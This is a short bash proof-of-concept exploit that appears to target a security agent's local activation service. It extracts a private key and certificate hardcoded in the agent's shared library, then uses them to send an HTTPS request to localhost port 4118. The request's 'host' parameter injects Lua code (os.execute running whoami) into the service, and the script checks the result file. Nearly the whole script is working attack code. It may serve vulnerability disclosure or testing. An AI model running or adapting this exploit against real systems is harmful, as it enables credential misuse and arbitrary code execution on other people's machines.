#!/bin/env bash

set -e

DSA_CORE_PATH=/opt/ds_agent/lib/dsa_core.so

echo 'Extracting harcoded private key and certificate from binary'
sed -n '/-----BEGIN PRIVATE KEY-----/,/-----END PRIVATE KEY-----/p' $DSA_CORE_PATH > dsa_core.key
strings $DSA_CORE_PATH | sed -n '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' > dsa_core.crt

INJECTED_CODE='os.execute("whoami > /poc")'

curl -v -k --key dsa_core.key --cert dsa_core.crt "https://localhost:4118/ActivateAgent?host=\",\"\",\"\");$INJECTED_CODE;aia%3DActivate(\"http"

cat /poc
